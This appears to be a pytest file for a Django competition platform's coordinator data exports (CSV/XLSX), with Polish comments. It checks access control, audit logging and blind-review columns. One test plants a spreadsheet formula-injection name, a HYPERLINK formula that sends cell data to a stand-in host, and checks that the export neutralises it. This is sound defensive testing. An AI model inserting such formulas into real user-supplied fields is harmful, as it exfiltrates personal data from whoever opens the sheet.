"""Eksport danych: zawartość arkuszy, oba formaty i wpis audytowy bez danych.

Eksport jest jedynym miejscem, z którego komplet danych osobowych wychodzi z systemu, więc
testy pilnują trzech rzeczy: że wychodzi tylko koordynatorowi, że wiersze naprawdę zawierają to,
czego organizator potrzebuje (łącznie z wersją dokumentu zgody), i że wpis audytowy niesie
wyłącznie liczbę wierszy.
"""

import csv
import io

import pytest

from apps.accounts.consents import ConsentKind
from apps.accounts.models import ConsentRecord, ConsentSource
from apps.competitions.tests.factories import StageEntryFactory
from apps.core.models import AuditLog
from apps.grading.tests.factories import FinalGradeFactory, ReviewFactory
from apps.submissions.models import SubmissionStatus
from apps.submissions.tests.factories import SubmissionFactory

pytestmark = pytest.mark.django_db

TERMS_VERSION = "1.0 testowa"


def _csv_rows(response) -> list[list[str]]:
    """Wiersze ze strumieniowanej odpowiedzi CSV, bez znacznika BOM."""
    text = b"".join(response.streaming_content).decode("utf-8").lstrip("﻿")
    return list(csv.reader(io.StringIO(text), delimiter=";"))


def test_participants_csv_carries_contact_data_and_consents(web_client, coordinator, entry):
    participant = entry.participant
    ConsentRecord.objects.create(
        participant=participant,
        kind=ConsentKind.TERMS,
        document_version=TERMS_VERSION,
        source=ConsentSource.WEB,
    )
    web_client.force_login(coordinator)

    response = web_client.get("/coordinator/export/participants/csv/")
    rows = _csv_rows(response)

    assert response.status_code == 200
    assert rows[0][0] == "kod publiczny"
    assert rows[1][0] == participant.public_code
    assert participant.user.email in rows[1]
    assert TERMS_VERSION in rows[1]


def test_participants_export_is_audited_with_the_row_count_only(web_client, coordinator, entry):
    web_client.force_login(coordinator)

    response = web_client.get("/coordinator/export/participants/csv/")
    b"".join(response.streaming_content)

    log = AuditLog.objects.get(action="export.generated")
    assert log.diff == {"kind": "participants", "format": "csv", "rows": 1}
    assert entry.participant.user.email not in str(log.diff)


def test_results_csv_has_one_column_per_problem(web_client, coordinator, elim_stage, entry, problems):
    submission = SubmissionFactory(entry=entry, problem=problems[0], status=SubmissionStatus.FINAL)
    FinalGradeFactory(submission=submission, score=5)
    web_client.force_login(coordinator)

    response = web_client.get(f"/coordinator/export/results/csv/?stage={elim_stage.pk}")
    rows = _csv_rows(response)

    assert "zadanie 1" in rows[0]
    assert "zadanie 2" in rows[0]
    # Praca oceniona na 5 i druga bez zgłoszenia (0) – suma jest liczona w trybie podglądu.
    assert rows[1][rows[0].index("razem")] == "5"


def test_reviews_csv_names_the_reviewer_but_not_the_participant(
    web_client, coordinator, elim_stage, entry, problems
):
    submission = SubmissionFactory(entry=entry, problem=problems[0], status=SubmissionStatus.IN_REVIEW)
    review = ReviewFactory(submission=submission)
    web_client.force_login(coordinator)

    response = web_client.get(f"/coordinator/export/reviews/csv/?stage={elim_stage.pk}")
    rows = _csv_rows(response)

    assert review.reviewer.user.email in rows[1]
    assert entry.participant.public_code in rows[1]
    # Ocenianie jest ślepe: w arkuszu recenzji uczestnik występuje wyłącznie pod kodem.
    assert entry.participant.user.last_name not in " ".join(rows[1])


def test_xlsx_export_returns_a_spreadsheet(web_client, coordinator, entry):
    web_client.force_login(coordinator)

    response = web_client.get("/coordinator/export/participants/xlsx/")

    assert response.status_code == 200
    assert response["Content-Type"].endswith("spreadsheetml.sheet")
    # Plik .xlsx jest archiwum ZIP – sygnatura „PK” wystarcza, żeby odróżnić go od strony błędu.
    assert response.content[:2] == b"PK"


def test_unknown_format_is_not_found(web_client, coordinator):
    web_client.force_login(coordinator)

    assert web_client.get("/coordinator/export/participants/json/").status_code == 404


def test_stage_export_without_a_stage_is_not_found(web_client, coordinator):
    web_client.force_login(coordinator)

    assert web_client.get("/coordinator/export/results/csv/").status_code == 404


def test_export_index_lists_the_stages(web_client, coordinator, elim_stage):
    web_client.force_login(coordinator)

    response = web_client.get("/coordinator/export/")

    assert response.status_code == 200
    assert elim_stage.display_name in response.content.decode()


def test_export_is_forbidden_for_a_participant(web_client, participant, elim_stage):
    StageEntryFactory(participant=participant, stage=elim_stage)
    web_client.force_login(participant.user)

    assert web_client.get("/coordinator/export/participants/csv/").status_code == 403


FORMULA_NAME = '=HYPERLINK("https://example.test/?d="&D2,"Kliknij")'


def test_a_name_that_looks_like_a_formula_is_exported_as_text(web_client, coordinator, entry):
    """Imię i nazwisko są wolnym tekstem od uczestnika, a arkusz otwiera koordynator."""
    from openpyxl import load_workbook

    user = entry.participant.user
    user.first_name, user.last_name = "@SUM(1+1)", FORMULA_NAME
    user.save(update_fields=["first_name", "last_name"])
    web_client.force_login(coordinator)

    rows = _csv_rows(web_client.get("/coordinator/export/participants/csv/"))
    sheet = load_workbook(io.BytesIO(web_client.get("/coordinator/export/participants/xlsx/").content)).active

    assert "'" + FORMULA_NAME in rows[1]
    assert "'@SUM(1+1)" in rows[1]
    cells = [cell for row in sheet.iter_rows(min_row=2) for cell in row]
    assert all(cell.data_type != "f" for cell in cells)
    assert "'" + FORMULA_NAME in [cell.value for cell in cells]


def test_a_control_character_in_a_name_does_not_break_the_spreadsheet(web_client, coordinator, entry):
    user = entry.participant.user
    user.last_name = "Kowal\x0bski"
    user.save(update_fields=["last_name"])
    web_client.force_login(coordinator)

    response = web_client.get("/coordinator/export/participants/xlsx/")

    assert response.status_code == 200
    assert response.content[:2] == b"PK"


def test_a_phone_number_keeps_its_plus_sign():
    from apps.core.exports import _cell

    assert _cell("+48 600 100 200") == "+48 600 100 200"
    assert _cell("-") == "-"
    assert _cell("\t=1+1") == "'=1+1"
